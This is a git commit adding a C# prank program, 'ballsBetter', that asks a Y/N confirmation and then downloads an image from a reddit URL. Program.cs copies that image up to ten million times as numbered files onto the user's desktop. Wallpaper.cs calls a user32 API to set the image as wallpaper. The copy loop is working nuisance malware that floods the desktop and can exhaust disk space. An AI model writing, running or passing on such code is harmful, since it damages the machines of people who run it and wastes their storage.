03db0606002279596eb2cbe4a78807666dfff5f3
zenx0x2 <zenxdotpy@gmail.com>
2022-01-18 19:44:44 +0100

    Files

---
+++ ballsBetter/Functions/Wallpaper.cs
@@ -0,0 +1,27 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Runtime.InteropServices;
+
+namespace ballsBetter.Functions
+{
+    public class Wallpaper
+    {
+        [DllImport("user32.dll")]
+
+        private static extern Int32 SystemParametersInfo(UInt32 action, UInt32 uParam, String vParam, UInt32 winIni);
+
+        static UInt32 SPI_SETWALL = 0x14;
+        static UInt32 SPIF_UPDATE = 0x01;
+        static UInt32 SPIF_SWEDWINI = 0x2;
+
+        static string filePath = @"C:\Users\" + Environment.UserName + @"\Desktop\balls.jpg";
+
+        public static void changeWallpaper()
+        {
+            SystemParametersInfo(SPI_SETWALL, 0, filePath, SPIF_UPDATE | SPIF_SWEDWINI);
+        }
+    }
+}
---
+++ ballsBetter/Program.cs
@@ -0,0 +1,88 @@
+﻿using System;
+using System.IO;
+using System.Net;
+using ballsBetter.Functions;
+
+namespace ballsBetter
+{
+    class Program
+    {
+
+        static int areYouSure()
+        {
+            Console.WriteLine("Are you sure you want to run balls? It might harm your PC. | Y/N");
+
+            string wtr = Console.ReadLine();
+
+            wtr.ToLower();
+
+            Console.WriteLine(wtr);
+
+            if (wtr == "y")
+            {
+                Console.WriteLine("balls");
+
+                runBalls();
+
+                Console.ReadKey();
+
+            }
+
+            else if (wtr == "n")
+            {
+                Console.WriteLine("Not balls");
+
+                Console.ReadKey();
+
+                return 0;
+            }
+
+            else
+            {
+                Console.WriteLine("Invalid Answer");
+
+                Console.ReadKey();
+            }
+
+            return 0;
+        }
+
+        static void runBalls()
+        {
+            string desktop = @"C:\Users\" + Environment.UserName + @"\Desktop\";
+            string localFilename = @"C:\Users\" + Environment.UserName + @"\Desktop\balls.jpg";
+            string logPath = @"C:\Users\" + Environment.UserName + @"\Documents\Balls\ballsLog.txt";
+
+            try
+            {
+                using (WebClient client = new WebClient())
+                {
+                    client.DownloadFile("https://i.redd.it/41ps5f0pnt771.png", localFilename);
+                }
+                for (int i = 0; i < 10000000; i++)
+                {
+                    string num = desktop + i.ToString() + ".jpg";
+                    File.Copy(localFilename, num);
+
+                    Console.WriteLine("Ball " + num);
+                }
+
+
+
+            }
+
+            catch (Exception e)
+            {
+                Console.WriteLine(e);
+            }
+
+            Wallpaper.changeWallpaper();
+        }
+
+        public static void Main(string[] args)
+        {
+            areYouSure();
+        }
+    }
+
+}
